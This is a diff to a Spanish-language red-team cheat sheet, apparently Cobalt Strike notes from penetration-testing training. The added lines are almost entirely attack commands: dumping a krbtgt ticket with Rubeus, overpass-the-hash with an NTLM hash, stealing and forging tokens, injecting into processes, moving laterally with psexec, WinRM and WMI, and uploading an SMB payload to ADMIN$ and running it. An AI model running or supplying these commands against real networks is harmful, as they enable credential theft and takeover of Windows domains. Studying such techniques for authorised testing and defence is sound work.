@@ -172,7 +172,7 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
 ```
 Coger el TGT
 ```
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x... /service:
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x... /service:krbtgt /nowrap
 ```
 
 # Domain Reconnaissance
@@ -254,4 +254,52 @@ steal_token proceso
 Matar el proceso cuando se haga rev2self
 ```
 kill proceso
+```
+## Overpass The Hash
+Pedir un TGT
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user: /ntlm: /opsec /nowrap
+```
+## Token Impersonation
+Listar los procesos
+```
+ps
+```
+Robar el token (para guardar el token, usar token-store...)
+```
+steal_token PID
+```
+## Make Token
+```
+make_token dominio\usuario pass
+```
+## Process Injection
+```
+inject PID x64 tcp-local
+```
+# Lateral Movement
+
+## Lateral Movement
+Mirar antes el software de la maquina
+```
+execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=
+```
+Jump
+```
+jump [psexec,winrm...] equipo [listener]
+```
+Remote-exec
+```
+remote-exec [psexec, winrm...] comando
+```
+## WMI
+Subir un payload a la maquina
+```
+cd \\PC\ADMIN$
+```
+```
+upload C:\Payloads\smb_x64.exe
+```
+```
+remote-exec wmi PC C:\Windows\smb_x64.exe
 ```
